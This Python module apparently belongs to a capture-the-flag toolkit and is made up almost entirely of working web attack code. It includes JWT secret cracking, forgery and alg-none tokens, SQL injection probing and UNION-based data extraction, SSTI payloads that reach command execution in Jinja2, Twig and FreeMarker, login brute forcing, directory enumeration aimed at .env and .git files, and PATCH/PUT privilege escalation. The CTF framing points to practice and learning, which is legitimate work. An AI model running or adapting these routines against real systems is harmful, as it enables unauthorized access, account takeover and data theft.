"""Web attack solvers — JWT, SQLi, SSTI, dir-enum, login brute, header analysis."""

import base64
import hashlib
import hmac
import json
import re
import time
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse, urlencode

try:
    import requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False

from .flag_detector import FlagDetector

_detector = FlagDetector()

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _session(timeout: int = 10) -> Any:
    if not _HAS_REQUESTS:
        raise ImportError("requests not installed")
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 ctf-tool/1.0"})
    return s


def _get(url: str, session=None, timeout: int = 10, **kwargs) -> Optional[Any]:
    try:
        s = session or _session(timeout)
        return s.get(url, timeout=timeout, allow_redirects=True, **kwargs)
    except Exception:
        return None


def _post(url: str, data=None, json_data=None, session=None, timeout: int = 10, **kwargs) -> Optional[Any]:
    try:
        s = session or _session(timeout)
        return s.post(url, data=data, json=json_data, timeout=timeout, **kwargs)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Recon / header analysis
# ---------------------------------------------------------------------------

def check_headers(url: str, timeout: int = 10) -> Dict:
    """Fetch URL and analyse security headers, cookies, interesting fields.

    Returns:
        dict with keys: status, headers, cookies, flags, interesting
    """
    r = _get(url, timeout=timeout)
    if r is None:
        return {"error": "request failed"}

    interesting = {}
    headers = dict(r.headers)

    # Security header checks
    sec_headers = [
        "X-Frame-Options", "Content-Security-Policy", "X-XSS-Protection",
        "Strict-Transport-Security", "X-Content-Type-Options",
        "Server", "X-Powered-By", "Set-Cookie",
    ]
    for h in sec_headers:
        if h.lower() in {k.lower(): v for k, v in headers.items()}:
            interesting[h] = headers.get(h, "")

    cookies = {c.name: c.value for c in r.cookies}
    body_flags = _detector.extract_all(r.text)

    return {
        "status":      r.status_code,
        "url":         url,
        "headers":     headers,
        "cookies":     cookies,
        "flags":       body_flags,
        "interesting": interesting,
        "body_preview": r.text[:500],
    }


def check_wellknown(base_url: str, timeout: int = 10) -> Dict:
    """Probe well-known and common recon endpoints.

    Returns:
        dict mapping path -> {status, body_preview, flags}
    """
    paths = [
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/.well-known/security.txt", "/.well-known/openid-configuration",
        "/openapi.json", "/swagger.json", "/api-docs",
        "/.git/config", "/.env", "/config.json", "/package.json",
        "/admin", "/admin/", "/login", "/register", "/api/",
    ]
    results = {}
    s = _session(timeout)
    for path in paths:
        url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
        r = _get(url, session=s, timeout=timeout)
        if r and r.status_code != 404:
            flags = _detector.extract_all(r.text)
            results[path] = {
                "status":       r.status_code,
                "body_preview": r.text[:300],
                "flags":        flags,
                "size":         len(r.content),
            }
    return results


def dir_enum(base_url: str, wordlist: List[str] = None,
             extensions: List[str] = None, timeout: int = 8) -> List[Dict]:
    """Enumerate directories and files at a URL.

    Args:
        base_url: Target base URL
        wordlist: List of paths to try (uses built-in short list if None)
        extensions: Extra extensions to append, e.g. ['.php', '.txt']
        timeout: Per-request timeout

    Returns:
        List of {url, status, size, flags}
    """
    if wordlist is None:
        wordlist = [
            "admin", "login", "register", "api", "api/v1", "api/v2",
            "dashboard", "user", "users", "profile", "config", "flag",
            "secret", "backup", "test", "dev", "debug", "upload", "uploads",
            "static", "assets", "js", "css", "img", "images", "files",
            "docs", "help", "info", "status", "health", "ping", "version",
        ]
    if extensions:
        extra = []
        for w in wordlist:
            for ext in extensions:
                extra.append(w + ext)
        wordlist = wordlist + extra

    found = []
    s = _session(timeout)
    for path in wordlist:
        url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
        try:
            r = s.get(url, timeout=timeout, allow_redirects=False)
            if r.status_code not in (404, 400, 410):
                flags = _detector.extract_all(r.text)
                found.append({
                    "url":    url,
                    "status": r.status_code,
                    "size":   len(r.content),
                    "flags":  flags,
                })
        except Exception:
            pass
    return found


# ---------------------------------------------------------------------------
# JWT
# ---------------------------------------------------------------------------

def jwt_decode(token: str) -> Dict:
    """Decode a JWT without verification. Returns header, payload, signature."""
    token = token.strip()
    parts = token.split(".")
    if len(parts) != 3:
        return {"error": "not a valid JWT (need 3 parts)"}

    def _b64decode_part(s: str) -> dict:
        s += "=" * (4 - len(s) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(s))
        except Exception:
            return {"raw": s}

    return {
        "header":    _b64decode_part(parts[0]),
        "payload":   _b64decode_part(parts[1]),
        "signature": parts[2],
        "raw":       token,
    }


def jwt_crack(token: str, wordlist_path: str = None,
              common_secrets: List[str] = None, timeout_secs: int = 60) -> Optional[str]:
    """Brute-force JWT HMAC secret.

    Args:
        token: The JWT token string
        wordlist_path: Path to wordlist file
        common_secrets: List of secrets to try first
        timeout_secs: Max time to spend

    Returns:
        Found secret string or None
    """
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None

    header_payload = f"{parts[0]}.{parts[1]}".encode()
    sig_bytes = base64.urlsafe_b64decode(parts[2] + "==")

    # Detect algorithm from header
    try:
        hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        alg = hdr.get("alg", "HS256")
    except Exception:
        alg = "HS256"

    alg_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_fn = alg_map.get(alg, hashlib.sha256)

    def check(secret: str) -> bool:
        try:
            sig = hmac.new(secret.encode(), header_payload, hash_fn).digest()
            return sig == sig_bytes
        except Exception:
            return False

    # Try common secrets first
    defaults = [
        "secret", "password", "key", "admin", "test", "jwt_secret",
        "your-256-bit-secret", "supersecret", "changeme", "12345",
        "qwerty", "letmein", "flag", "ctf", "hackme", "",
    ]
    for s in (common_secrets or []) + defaults:
        if check(s):
            return s

    # Try wordlist
    if wordlist_path:
        start = time.time()
        try:
            with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if time.time() - start > timeout_secs:
                        break
                    secret = line.rstrip("\n")
                    if check(secret):
                        return secret
        except FileNotFoundError:
            pass

    return None


def jwt_forge(payload: Dict, secret: str, algorithm: str = "HS256") -> str:
    """Create a signed JWT with given payload and secret.

    Args:
        payload: Dict to put in JWT payload
        secret: Signing secret
        algorithm: HS256/HS384/HS512

    Returns:
        Signed JWT string
    """
    alg_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_fn = alg_map.get(algorithm, hashlib.sha256)

    def b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header = b64url(json.dumps({"alg": algorithm, "typ": "JWT"}).encode())
    body = b64url(json.dumps(payload).encode())
    signing_input = f"{header}.{body}".encode()
    sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
    return f"{header}.{body}.{b64url(sig)}"


def jwt_none_attack(token: str) -> str:
    """Craft a JWT with algorithm set to 'none' (removes signature)."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        return token

    def b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    # Replace alg with none
    try:
        hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    except Exception:
        hdr = {}
    hdr["alg"] = "none"
    new_header = b64url(json.dumps(hdr).encode())
    return f"{new_header}.{parts[1]}."


# ---------------------------------------------------------------------------
# SQL injection
# ---------------------------------------------------------------------------

_SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
    "' OR 'a'='a", "1' ORDER BY 1--", "1' ORDER BY 2--",
    "1 UNION SELECT NULL--", "' AND SLEEP(1)--",
]

_SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "pg_query", "sqlite",
    "syntax error", "unclosed quotation", "you have an error",
    "division by zero", "invalid column", "table or view",
]


def sqli_test(url: str, param: str, method: str = "GET",
              timeout: int = 10) -> Dict:
    """Test a parameter for SQL injection.

    Returns:
        {vulnerable, error_based, blind, payloads_tried, evidence}
    """
    result = {
        "vulnerable": False,
        "error_based": False,
        "blind": False,
        "payloads_tried": [],
        "evidence": [],
    }
    s = _session(timeout)

    for payload in _SQLI_PAYLOADS:
        result["payloads_tried"].append(payload)
        try:
            if method.upper() == "GET":
                full_url = url + ("&" if "?" in url else "?") + f"{param}={payload}"
                r = s.get(full_url, timeout=timeout)
            else:
                r = s.post(url, data={param: payload}, timeout=timeout)

            body_lower = r.text.lower()
            for err in _SQLI_ERRORS:
                if err in body_lower:
                    result["vulnerable"] = True
                    result["error_based"] = True
                    result["evidence"].append({"payload": payload, "error": err})
                    break

            flags = _detector.extract_all(r.text)
            if flags:
                result["vulnerable"] = True
                result["evidence"].append({"payload": payload, "flags": flags})

        except Exception:
            pass

    return result


def sqli_extract(url: str, param: str, query: str,
                 method: str = "GET", timeout: int = 10) -> Optional[str]:
    """Extract data via UNION-based SQLi.

    Args:
        url: Target URL
        param: Vulnerable parameter name
        query: SQL query to inject, e.g. "SELECT password FROM users LIMIT 1"
        method: GET or POST

    Returns:
        Extracted string value or None
    """
    payloads = [
        f"' UNION SELECT ({query})--",
        f"' UNION SELECT ({query})-- -",
        f"1 UNION SELECT ({query})--",
        f"0 UNION ALL SELECT ({query})--",
    ]
    s = _session(timeout)
    for p in payloads:
        try:
            if method.upper() == "GET":
                full_url = url + ("&" if "?" in url else "?") + f"{param}={p}"
                r = s.get(full_url, timeout=timeout)
            else:
                r = s.post(url, data={param: p}, timeout=timeout)

            flags = _detector.extract_all(r.text)
            if flags:
                return flags[0]

            # Try to find value in response
            match = re.search(r"[A-Za-z0-9_!@#$%^&*()\-+={}\[\]|:;<>,.?/~`]{4,}", r.text)
            if match:
                return match.group(0)
        except Exception:
            pass
    return None


# ---------------------------------------------------------------------------
# SSTI
# ---------------------------------------------------------------------------

_SSTI_PAYLOADS = {
    "jinja2":   ["{{7*7}}", "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}"],
    "twig":     ["{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('system')}}"],
    "freemark": ["${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>"],
    "velocity": ["#set($x=7*7)$x", "#set($r=$class.inspect('java.lang.Runtime').type)"],
    "generic":  ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
}


def ssti_test(url: str, param: str, method: str = "GET",
              timeout: int = 10) -> Dict:
    """Test a parameter for Server-Side Template Injection.

    Returns:
        {vulnerable, engine, evidence, payloads_tried}
    """
    result = {"vulnerable": False, "engine": None, "evidence": [], "payloads_tried": []}
    s = _session(timeout)

    for engine, payloads in _SSTI_PAYLOADS.items():
        for payload in payloads:
            result["payloads_tried"].append(payload)
            try:
                if method.upper() == "GET":
                    full_url = url + ("&" if "?" in url else "?") + f"{param}={payload}"
                    r = s.get(full_url, timeout=timeout)
                else:
                    r = s.post(url, data={param: payload}, timeout=timeout)

                if "49" in r.text:  # 7*7=49
                    result["vulnerable"] = True
                    result["engine"] = engine
                    result["evidence"].append({"payload": payload, "found": "49"})
                    return result

                flags = _detector.extract_all(r.text)
                if flags:
                    result["vulnerable"] = True
                    result["evidence"].append({"payload": payload, "flags": flags})
            except Exception:
                pass

    return result


# ---------------------------------------------------------------------------
# Login brute force
# ---------------------------------------------------------------------------

def login_brute(url: str, user_field: str, pass_field: str,
                username: str, wordlist: List[str],
                success_indicator: str = None,
                timeout: int = 8) -> Optional[str]:
    """Brute-force a login form.

    Args:
        url: Login endpoint URL
        user_field: Form field name for username
        pass_field: Form field name for password
        username: Username to use
        wordlist: List of passwords to try
        success_indicator: String that appears on success (auto-detect if None)

    Returns:
        Found password or None
    """
    s = _session(timeout)
    # First request to detect baseline
    baseline = _post(url, data={user_field: "invalid_user_xyz",
                                pass_field: "invalid_pass_xyz"},
                     session=s, timeout=timeout)
    baseline_text = baseline.text[:500] if baseline else ""

    for password in wordlist:
        try:
            r = s.post(url, data={user_field: username, pass_field: password},
                       timeout=timeout)
            if r is None:
                continue

            text = r.text
            # Check success
            if success_indicator and success_indicator in text:
                return password
            if not success_indicator:
                # Auto detect: shorter error / different content / redirect / flag
                if r.status_code in (200,) and len(text) != len(baseline_text):
                    if "invalid" not in text.lower() and "error" not in text.lower():
                        return password
                if r.status_code in (301, 302, 303):
                    return password
                flags = _detector.extract_all(text)
                if flags:
                    return password
        except Exception:
            pass
    return None


# ---------------------------------------------------------------------------
# Privilege escalation (PATCH/PUT profile)
# ---------------------------------------------------------------------------

def patch_auth_bypass(url: str, payload: Dict,
                      session=None, timeout: int = 10) -> Dict:
    """Try PATCH/PUT to escalate privileges or bypass auth.

    Args:
        url: API endpoint (e.g. /api/v2/player/profile)
        payload: JSON body to send

    Returns:
        {status, response, flags}
    """
    s = session or _session(timeout)
    results = {}
    for method in ["PATCH", "PUT"]:
        try:
            r = s.request(method, url, json=payload,
                          headers={"Content-Type": "application/json"},
                          timeout=timeout)
            flags = _detector.extract_all(r.text)
            results[method] = {
                "status":   r.status_code,
                "response": r.text[:500],
                "flags":    flags,
            }
        except Exception as e:
            results[method] = {"error": str(e)}
    return results
